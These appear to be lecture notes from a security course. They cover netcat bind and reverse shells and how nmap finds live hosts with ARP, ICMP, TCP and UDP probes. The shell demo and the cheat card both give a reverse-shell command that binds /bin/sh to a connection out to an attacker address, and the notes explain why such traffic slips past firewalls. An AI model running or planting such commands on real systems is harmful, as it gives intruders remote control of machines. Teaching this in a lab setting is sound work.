# Explained — 051 — Day 7: Bind vs. Reverse Shells + Live Host Discovery with Nmap

**Source:** Defronix Network Security Day-7 (Ayush Pathak; recorded after a nine-day gap — normal cadence resumed)
**Room stack:** shells crash-course → TryHackMe "Nmap Live Host Discovery" room with its on-site ARP simulator
**Why it matters:** Day-7 welds the two halves of a network attack's life-cycle. The **shell** section answers "once my code runs on the victim, how do I *talk* to it?" (netcat in reverse mode). The **host-discovery** section answers the earlier question "of all these IP addresses, which ones are even *alive*?" — the step that must happen before any port scanning, and the step firewalls are specifically configured to defeat. Skipping discovery = hours wasted scanning dead IPs (the Day-6 lesson); this lecture is the toolbox for doing discovery *reliably*, on and off your LAN.

---

## 1) Shells — the concept (finally spelled out)

> *"You type a command on your machine → the command travels to the target → it executes there → the generated output travels back to you."*

A **shell** is any arrangement that gives you that loop on a remote machine. It requires three things: (1) something of yours **already running** on the victim (a *payload* — made with Metasploit/msfvenom or hand-written; how payloads are *built* is postponed to a later lecture), (2) a network path, and (3) an **established connection** — because a connection is the only channel commands/output can ride on.

### The WSL two-terminal trick

The demo runs inside **Windows Subsystem for Linux**: two Kali terminal windows on one PC — one plays "attacker," one plays "victim." There's no need for two physical machines plus a router to rehearse a connection's *shape*; the loop works identically across localhost. Same for the earlier TryHackMe note — an **AttackBox + their network**, or your Kali with a prepended VPN splitter, ends at the same place.

Warm-up (pure chat, no shell): window A listens — `nc -nvlp 44`; window B dials — `nc <its-IP> 44`; text typed on one side appears on the other, both ways. nmap's cousin netcat gives you **two-way communication over any port you both agree on** (ports ≤1024 need root — Lecture 4).

---

## 2) Bind vs. reverse — the single most-used decision in post-exploitation

| | **Bind shell** | **Reverse shell** |
|---|---|---|
| Who listens | **VICTIM** (its payload opens a port) | **ATTACKER** (you run the listener) |
| Who connects | You → victim | Victim → you |
| IP that must be known/fixed | The *victim's* (dynamic — changes on every router reboot/DHCP/ config change ⇒ you'd have to re-discover it daily) | *Yours* — hardcoded **into the payload** and made **static** |
| How the victim's firewall sees it | *Unsolicited inbound* connection → **suspicious**, often blocked | *Outbound initiated by the victim itself* → **normal traffic**, allowed |
| Verdict | Fragile over the internet | **The standard** — "that's why we use reverse shell" |

> The lecture's one-line essence: *"from the front connecting looks suspicious; the machine itself connecting out — the firewall doesn't care."*

### The live demo

```
attacker$  nc -nvlp 444        # IERRL: Listen, Verbose, No-DNS, Port 444 — keep it up after each
                               #         connection (lecture: "re-claim karne ki jarurat nahi")
victim$    nc <attacker-IP> 444 -e /bin/sh   # the payload's job: dial out AND bind /bin/sh to it
attacker$  id                  # typed at the attacker... output of the VICTIM'S id command returns
```

Moment the victim box connects, the attacker's listener shows the session — every keystroke now executes remotely, output returns ("jo bhi yahan kar raha hun aa jayega"). Everything Day-6's netcat chat hinted at, now weaponized. Production note kept for later: replacing the hand-typed `nc … -e` line with a real **payload delivery** (msfvenom-generated binaries, phishing, etc.) is a separate art — *next* topic, not this one.

---

## 3) Why discovery starts with ARP — and why it must *stop* there

Recap from Lecture 3 with the new purpose attached. Inside a LAN, delivery is by MAC; to reach `192.168.1.35` your NIC first broadcasts: **"who has 192.168.1.35?"** — the owner alone replies with its MAC. Two facts you must internalise:

1. **Broadcasts do not cross routers.** Your ARP "who-has" reaches every host *in your subnet*, and not one inch beyond — certainly never "onto the internet."
2. Ergo **ARP *is* a perfect live-host probe — but only locally.** Everyone on your segment hears it; every live one answers; the reply **is** proof of life.

The THM simulator bakes this in visually: computer-1's broadcast is seen by computer-2, computer-3, the switches — while **computer-6, living on the other subnet, neither hears nor answers** it. Sim quiz takeaways: before a first-ever `ping`, the machine *first* emits an ARP request (learning the MAC); repeat pings don't re-ARP (the **ARP cache** remembers); and a plain ARP sweep of the diagram "catches **3 devices**."

**Corollary:** any scan whose traffic is ARP-based (this includes nmap's default on a LAN, and the `arp-scan` tool) **cannot** enumerate hosts on other subnets or on the internet — for those you need probes routed at Layer 3: ICMP, TCP, UDP. That Layer-3 toolbox is the rest of the lecture.

---

## 4) Telling nmap WHICH addresses — CIDR and range notation

Discovery needs an address set. nmap takes all of these in one argument list:

- **CIDR:** `nmap -sn 192.168.1.0/24` → all 256 addresses `.0`–`.255` (yes, `.0` and the broadcast are probed too — "zero include hota hai"). Non-octet masks (`/19`, `/23`) produce non-obvious sets — fine, that's what the notation is *for*.
- **Octet ranges/lists:** `192.168.1.0-25`, `…101-125`, and even `1-2.0-250`-style multi-octet forms, where each octet expands independently and the counts **multiply** (the lecture's calculator comedy: 256 values × 25 = **6400 targets** from two little octets).
- Grep-what-you-need afterwards; nmap prints the expansion it intends to scan.

His meta-advice, worth repeating: don't **memorise** flag spellings — know the *method* (what probes exist, why you'd pick one), look the switch up when needed.

**`-sn` — the discovery-only switch:** *ping scan*: enumerate live hosts and STOP — **no port scan follows**. (Recall Day-4: port-scan defaults hit the top-1000 ports and accept banners; `-sn` is how you get a quiet census *before* you commit to that.) Pair with knowledge from Day-6: `-sn`'s older `-sP`/`-Pn` family once confused everyone; today: `-sn` = discover only, **`-Pn` = don't discover at all, assume up.**

---

## 5) What nmap actually sends when you don't specify (the privilege/location matrix)

These are the THM-room facts he flagged as "the one thing to remember":

| Your position | Default probes |
|---|---|
| **Privileged** (root/sudo) scanning **same LAN** | **ARP requests** (fastest, unblockable locally) |
| **Privileged**, target **outside** the LAN | **ICMP echo** + TCP SYN to 443 + TCP ACK to 80 + ICMP timestamp |
| **Unprivileged** user, target outside LAN | **TCP connect (full 3-way handshake) attempts** to 80/443 — because raw packets need root; a completed handshake still proves the host is alive |

Everything else is you *overriding* those defaults with flags — next sections.

---

## 6) ICMP probes — echo, timestamp, address-mask

- **Echo** — the classic ping: **Type 8** = echo *request*, **Type 0** = echo *reply*. `-PE` forces this.
- **Timestamp** — **Type 13** request / **Type 14** reply. `-PP`. A "what time is it?" probe; an answer means a live kernel.
- **Address mask** — **Type 17** request / **Type 18** reply. `-PM`. Asks the subnet mask; still answered by some gear (routers especially).

**Why three flavours? Firewalls pick favourites.** The lecture's concrete case: **Microsoft Windows' firewall blocks ICMP echo by default** ⇒ a perfectly alive Windows box stays silent to `ping` — *silent ≠ down*. Options: hammer other ICMP types (`-PP`, `-PM`) that the admin forgot to fence, or fall through to TCP/UDP probes below — or in the bulletproof case **`nmap -Pn`** ("I *know* it's alive — skip discovery, just scan"; you'd hand-loaded the target list from other intel).

---

## 7) TCP pings — SYN (`-PS`) and ACK (`-PA`)

- **TCP SYN ping `-PS[ports]`** (default **port 80**): send a bare SYN. Replies: **SYN/ACK** = alive (someone offers that port); **RST** = *also alive* — "if the reset came back, a machine exists and actively refused that port; only *silence* suggests dead-or-filtered." Both outcomes are discoveries. `-PS21`, `-PS22,80,443` customise the ports (his `-PS21 … sorry, 22` wobble: any list works).
- **TCP ACK ping `-PA[ports]`** (default port 80): send an ACK belonging to *no* connection. RFC-conformant stacks must answer **RST** to nonsensical ACKs — so **any RST = live host**. Useful because naive stateless firewalls that kill all SYNs let out-of-the-blue ACKs sail through (they assume it belongs to an "established" flow).

The pattern to see: TCP gives host-discovery **two independent circuits** (SYN-answers, ACK-answers), and "closed port" is a *positive signal*, not a failure — routers along the way prove nothing, but **anything that answers at all is alive.**

---

## 8) UDP ping (`-PU`) — discovery via error messages

UDP has no handshake, so the trick inverts: fire a UDP datagram at a port you *expect to be closed*. A live machine with a closed port answers **ICMP "destination port unreachable"** — and that error **is your proof of life**. Silence = dead *or* the port was open *or* ICMP got filtered; that's UDP discovery's inherent fuzziness, which is why it's the third choice, not the first. (Same reflex as Lecture 4's `-sU` port scans: open UDP ports are usually silent — count on the errors.)

**Tool sibling — `masscan`:** name-dropped for the same job at country-scale; you hand it IP lists and it SHOUTS probes at insane rates. Know it exists; nmap remains the precision instrument.

---

## 9) `arp-scan` — the LAN census tool

Separate binary (Kali has it), one job: **ARP-sweep an entire range** — it iterates *every IP in the range* and broadcasts a who-has for each (`arp-scan 192.168.1.0/24`), printing the MAC + vendor of everyone alive. Two operational details demoed: it only works **inside your own network** (per §3), and with **multiple NICs** you must say which wire to shout on — `-I eth0`-style **interface selection** (his "dusra interface de raha hai" moment). Quick mental model: `arp-scan` ≈ nmap's LAN-ARP phase, extracted into a standalone hammer.

---

## 10) DNS behaviour during scanning — three flags

While scanning, nmap likes to **reverse-resolve** each live IP to a hostname (that's why hits print a name next to the IP). Control it:

| Flag | Effect |
|---|---|
| *(default)* | rDNS lookup for **live/online** hosts only |
| **`-n`** | **No** DNS at all — faster, quieter, less leakage |
| **`-R`** | rDNS for **all** hosts in the list — **even offline-looking ones** (room quiz: "we want NFS… reverse DNS lookup for all" → `-R`) |
| **`--dns-servers <ip>`** | Use a **specific resolver** (e.g. the target's own DNS server) instead of yours — can surface internal names your resolver never hears |

---

## 11) The discovery decision flow (memorise *this*, not flags)

```
Is the target on MY subnet? ──yes──► ARP sweep (nmap -sn does it automatically;
│                                     arp-scan for a dedicated pass)
no
▼
Do I just want a quick "is it up"? ──► ICMP echo(-PE); dead? try -PP/-PM (Windows blocks echo)
▼
Being filtered / need certainty? ────► TCP probes: -PS (SYN; SYN/ACK OR RST = alive),
│                                      -PA (ACK; RST = alive) against 80/443/22/21 lists
▼
Still silent? ─────────────────────► UDP to a closed port (-PU): ICMP unreachable = alive
▼
Intel already says alive / too loud? ► -Pn — skip discovery entirely, go scan the ports
```

Privileged vs. unprivileged defaults (§5) slot into this as "what nmap silently chose for me."

Privilege note stacking from Lectures 3–4: **root on Kali = raw-socket scans** (`-sS`, ARP, ICMP crafting); **no root = `-sT`/connect attempts**. WSL defaults you to root when launched `wsl -u root` — which is why his Kali window could ARP/ping at will.

---

## 12) Pitfalls & "aha" details worth keeping

- **A silent host is not a dead host.** Firewalls swallow ICMP; stateful filters ignore stray SYNs. The lecture repeats it for ping, SYN, and UDP cases. Conclusion errors here poison every later phase.
- **Closed ports answer too.** RST (TCP) and ICMP-unreachable (UDP) are both *responses* — "the port is closed" simultaneously confirms "the **host is up**." Train the reflex: any packet *from* the target = discovered.
- **Broadcasts stop at routers** — the one fact that explains why ARP discovery is LAN-only and why the sim's computer-6 stayed mute.
- **Repeat pings skip re-ARP** (cache) — the simulator's "send another ping" step showing no fresh ARP.
- **Multi-octet ranges multiply silently** — two innocent octet lists ballooned to 6400 targets; expansion size surprises show up as *scan duration* surprises.
- **`-sn` vs `-Pn` are opposites, not siblings**: discover-only vs. never-discover. Misreading them mid-engagement either re-invents scanning or skips it.
- **Port 33/44/444** samples in chat demos are arbitrary — nothing magic; just stay above 1024 to dodge the root-equirement on the bind port (Lecture 4).
- Reverse-shell firewall logic generalises: defenders *also* mirror it — strict **egress** filtering is what kills commodity reverse shells; that's the blue-team flip side of today's trick.
- **Interface matters on multi-homed boxes** — Kali/WSL leapt between adapters until `-I` fixed it.

---

## 13) 20-second cheat card

```
SHELLS
nc -nvlp PORT                 # attacker listener (l=listen v=verbose n=noDNS p=port)
nc IP PORT -e /bin/sh         # victim-side connect-back (what real payloads automate)
bind    = victim listens, you dial in   → dies with victim IP churn; inbound looks shady
reverse = you listen, victim dials out  → YOUR static IP hardcoded; outbound sails the fw

WHO'S ALIVE?  (nmap -sn  = discover only; -Pn = assume alive, skip discovery)
LAN : ARP broadcast (auto when root) / arp-scan [-I eth0] RANGE   — same subnet ONLY
ICMP: -PE echo(8→0)  -PP timestamp(13→14)  -PM addr-mask(17→18)   ← Windows fw blocks echo
TCP : -PS80 SYN-ping: SYN/ACK = up, RST = up (closed port ≠ dead box!)
      -PA80 ACK-ping: RST = up
UDP : -PU  closed port → ICMP unreachable = up
DNS : -n none · -R resolve even offline · --dns-servers IP custom resolver
Defaults: root+LAN→ARP · root+WAN→ICMP+TCP probes · non-root+WAN→TCP connect(80/443)
Ranges: /24=256 · 101-125=25 · multi-octet multiplies (256×25=6400)
```

---

**Next (Day-8, announced in this lecture):** the other half of nmap — **port scanning types, basic → advanced** (the connect/SYN/NULL/FIN/Xmas/ACK/window family from Lecture 4, now run hands-on against the THM rooms).
